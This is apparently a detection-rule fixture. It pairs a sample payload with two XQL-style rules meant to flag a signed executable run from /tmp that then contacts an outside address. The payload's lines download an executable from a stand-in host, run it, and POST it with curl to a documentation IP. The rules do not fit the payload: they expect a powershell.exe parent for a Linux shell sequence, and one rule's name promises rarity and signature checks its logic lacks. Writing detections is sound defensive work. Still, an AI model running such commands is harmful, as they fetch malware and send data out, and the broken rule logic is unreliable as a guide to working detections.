payload.code:
wget https://example.com/malware.exe -O /tmp/malware.exe
stub chmod +x /tmp/malware.exe
stub /tmp/malware.exe
stub curl -X POST http://192.0.2.10:8080/ --data-binary @/tmp/malware.exe

biocs.name: Rare signature signed executable executed in the network
biocs.description: Detection of rare signed executable being executed within the network
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains '.exe'
| filter actor_process_image_name contains 'powershell.exe'
| filter action_file_path contains '/tmp/'

abiocs.name: Signed Executable Network Behavior
abiocs.description: Detection of signed executable execution followed by outbound network communication
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains '.exe'
| filter actor_process_image_name contains 'powershell.exe'
| filter action_file_path contains '/tmp/'
| join with network_events on action_process_image_name
| filter dst_ip = '192.0.2.10'
